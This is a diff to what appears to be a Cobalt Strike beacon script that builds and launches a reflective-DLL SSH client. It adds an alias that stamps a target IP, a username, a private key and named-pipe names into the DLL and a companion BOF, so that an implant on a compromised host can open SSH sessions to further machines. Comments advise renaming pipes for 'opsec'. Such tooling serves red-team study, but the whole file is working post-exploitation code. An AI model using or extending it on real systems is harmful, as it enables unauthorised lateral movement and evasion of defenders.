@@ -1,6 +1,6 @@
 import beacon.CommandBuilder;
 
-global('$ssh_inited $pipe_wait $error_1 $ssh_key_stomp_me $usage $server_dll_name $bof_write_pipe_name $reading_inited $pipe_output_name_final $pipe_input_name_final $pipe_output_stomp_me_name $pipe_input_stomp_me_name $ssh_ip_stomp_me $ssh_username_stomp_me $ssh_password_stomp_me');
+global('$ssh_inited $pipe_wait $error_1 $ssh_key_stomp_me $usage $rssh_dll_name $bof_write_pipe_name $reading_inited $pipe_output_name_final $pipe_input_name_final $pipe_output_stomp_me_name $pipe_input_stomp_me_name $ssh_ip_stomp_me $ssh_username_stomp_me $ssh_password_stomp_me');
 $ssh_inited = -1;
 $reading_inited = -1;
 $pipe_output_name_final = "BigGasPipe_updater_01_"; # Change the pipe name an reload the CNA for 'opsec', 25-bytes MAX
@@ -17,7 +17,7 @@ $ssh_password_stomp_me = "PASSWORD_STRING_NO_CHANGE_PLS_PASSWORD_STRING_NO_CHANG
 
 $pipe_wait = 30000; # Custom timeout
 
-$server_dll_name = "dll_rs.shc.x64.dll"; # default name
+$rssh_dll_name = "dll_rs.shc.x64.dll"; # default name
 $bof_write_pipe_name  = "bof_write_pipe.x64.o";
 $usage = "You must init ssh first. Try: rssh-init <target ip> <username> <password> <optional: pid>";
 $error_1 = "[RSSH] is already initialized.";
@@ -82,6 +82,111 @@ sub stomp-str {
 # $2 - target IP address
 # $3 - username
 # $4 - path to ssh key (PEM format)
+alias rssh-generate-client {
+    local('$barch $beacon_id $pid $rdll_path $rdll_path_out $target_ip $target_username $target_password $target_ssh_key_path $target_ssh_key $rdll $handle $actual_pipe_name $desired_length $null_padding $padding_needed $padded_pipe_name $bof_path $bof_path_out $bof_data');
+    $beacon_id = $1;
+    $target_ip = $2; # target ip
+    $target_username = $3;
+    $target_ssh_key_path = $4;
+
+    if($target_ip is $null || $target_username is $null || $target_ssh_key_path is $null){
+        berror($beacon_id , "Invalid arguments");
+        return;
+    }
+
+    # Get current beacon info
+    $barch = beacon_info($beacon_id, "barch");
+
+    if ($barch != "x64") {
+        berror($beacon_id , "[RSSH] This script only supports x64 processes");
+        return;
+    }
+
+    # Build rdll path; This needs rework if you want to support x86 for whatever reason
+    # The server must have the interface IP, PORT, username, password, input pipe and outputpipe names stomped in 
+    $rdll_path = getFileProper(script_resource("."), "bins", "x64", $rssh_dll_name);
+
+    $rdll_path_out = getFileProper(script_resource("."), "out", "x64", $rssh_dll_name);
+    
+    # Build bof path; This needs rework if you want to support x86 for whatever reason
+    $bof_path = getFileProper(script_resource("."), "bins", "x64", $bof_write_pipe_name);
+
+    $bof_path_out = getFileProper(script_resource("."), "out", "x64", $bof_write_pipe_name);
+
+    # RDLL STOMP IP Address, this is the ip of the SSH server we want to connect to #
+    # Get rdll contents
+    $handle = openf($rdll_path);
+    $rdll = readb($handle, -1);
+
+    # Close handle
+    closef($handle);
+
+    # Read SSH key
+    $handle = openf($target_ssh_key_path);
+    $target_ssh_key = readb($handle, -1);
+
+    # Close handle
+    closef($handle);
+
+    # Now use $ssh_ip_stomp_me in strrep
+    $rdll = stomp-str($rdll, $ssh_key_stomp_me, "2049", $target_ssh_key);
+
+    # Now use $ssh_ip_stomp_me in strrep
+    $rdll = stomp-str($rdll, $ssh_ip_stomp_me, "15", $target_ip);
+
+    # RDLL STOMP Username that we want to use to try to authenticate to the SSH server  #
+    # Now use $ssh_username_stomp_me in strrep
+    $rdll = stomp-str($rdll, $ssh_username_stomp_me, "64", $target_username);
+
+    # RDLL STOMP Password that we want to use to try to authenticate to the SSH server  #
+    # Now use $ssh_password_stomp_me in strrep
+    $rdll = stomp-str($rdll, $ssh_password_stomp_me, "64", $null);
+
+    # RDLL STOMP INPUT PIPE, this is the pipe we use to send commands that are forwarded to the rdll to the target  #
+    # Now use $pipe_input_stomp_me_name in strrep
+    $rdll = stomp-str($rdll, $pipe_input_stomp_me_name, "29", $pipe_input_name_final);
+
+    # RDLL STOMP OUTPUT PIPE, this is the pipe we use to send commands that are forwarded to the rdll to the target   #
+    # Now use $pipe_input_stomp_me_name in strrep
+    $rdll = stomp-str($rdll, $pipe_output_stomp_me_name, "30", $pipe_output_name_final);
+
+    # Open output handle
+    $handle = openf(">" . $rdll_path_out);
+
+    # Write rdll back down
+    writeb($handle, $rdll);
+
+    # Close handle
+    closef($handle);
+
+    # BOF STOMP INPUT PIPE, this is the pipe we use to send commands that are forwarded to the rdll to the target #
+    # Get BOF contents
+    $handle = openf($bof_path);
+    $bof_data = readb($handle, -1);
+
+    # Close handle
+    closef($handle);
+
+    # Now use $pipe_input_stomp_me_name in strrep
+    $bof_data = stomp-str($bof_data, $pipe_input_stomp_me_name, "29", $pipe_input_name_final);
+
+    # Open output handle
+    $handle = openf(">" . $bof_path_out);
+
+    # Write BOF back down
+    writeb($handle, $bof_data);
+
+    # Close handle
+    closef($handle);
+
+    println("[RSSH] RSSH dll" . $rssh_dll_name . " generated into " . getFileProper(script_resource(".")) . "out" . " directory.");
+}
+
+
+# $1 - beacon id
+# $2 - target IP address
+# $3 - username
+# $4 - path to ssh key (PEM format)
 # $5 - process id of injection target (optional)
 alias rssh-key-init {
     local('$barch $beacon_id $pid $rdll_path $rdll_path_out $target_ip $target_username $target_password $target_ssh_key_path $target_ssh_key $rdll $handle $actual_pipe_name $desired_length $null_padding $padding_needed $padded_pipe_name $bof_path $bof_path_out $bof_data');
@@ -122,9 +227,9 @@ alias rssh-key-init {
 
     # Build rdll path; This needs rework if you want to support x86 for whatever reason
     # The server must have the interface IP, PORT, username, password, input pipe and outputpipe names stomped in 
-    $rdll_path = getFileProper(script_resource("."), "bins", "x64", $server_dll_name);
+    $rdll_path = getFileProper(script_resource("."), "bins", "x64", $rssh_dll_name);
 
-    $rdll_path_out = getFileProper(script_resource("."), "out", "x64", $server_dll_name);
+    $rdll_path_out = getFileProper(script_resource("."), "out", "x64", $rssh_dll_name);
     
     # Build bof path; This needs rework if you want to support x86 for whatever reason
     $bof_path = getFileProper(script_resource("."), "bins", "x64", $bof_write_pipe_name);
@@ -261,9 +366,9 @@ alias rssh-init {
 
     # Build rdll path; This needs rework if you want to support x86 for whatever reason
     # The server must have the interface IP, PORT, username, password, input pipe and outputpipe names stomped in 
-    $rdll_path = getFileProper(script_resource("."), "bins", "x64", $server_dll_name);
+    $rdll_path = getFileProper(script_resource("."), "bins", "x64", $rssh_dll_name);
 
-    $rdll_path_out = getFileProper(script_resource("."), "out", "x64", $server_dll_name);
+    $rdll_path_out = getFileProper(script_resource("."), "out", "x64", $rssh_dll_name);
     
     # Build bof path; This needs rework if you want to support x86 for whatever reason
     $bof_path = getFileProper(script_resource("."), "bins", "x64", $bof_write_pipe_name);
@@ -448,7 +553,7 @@ alias rssh-exit {
 # --------------------
 beacon_command_group(
 	"rssh",
-	"User-Defined Reflective DLLs",
+	"User-Defined SSH Client",
 	"User-implemented reflective DLL that enables SSH communications with a target."
 );
 
@@ -461,8 +566,8 @@ beacon_command_register(
 
 beacon_command_register(
 	"rssh-key-init",
-	"(64-bit only) Initializes RDLL and BOF to enable SSH session to target host with a private key. ",
-	"rssh-init <target ip> <username> <path to private key> <optional: pid>",
+	"(64-bit only) Initializes RDLL and BOF to enable SSH session to target host with a private key, and start the SSH client. ",
+	"rssh-init <target ip> <username> <path to private key> <optional: pid>\nex: rssh-key-init 192.0.0.1 my_username 'C:\\My_Path\\id_key'",
 	"rssh"
 );
 
@@ -477,5 +582,12 @@ beacon_command_register(
 	"rssh-exit",
 	"(64-bit only) Uses a bof to write the exit command to a pipe that is read by a user implemented reflective DLL and sent to the ssh target. SSH session exits.",
 	"rssh-exit\nex:rssh-exit",
+	"rssh"
+);
+
+beacon_command_register(
+	"rssh-generate-client",
+	"(64-bit only) Builds Server binary with configuration specified in .cna without starting the SSH client.",
+	"rssh-generate-client <target ip> <username> <path to private key>\nex: rssh-generate-client 192.0.0.1 my_username 'C:\\My_Path\\id_key'",
 	"rssh"
 );
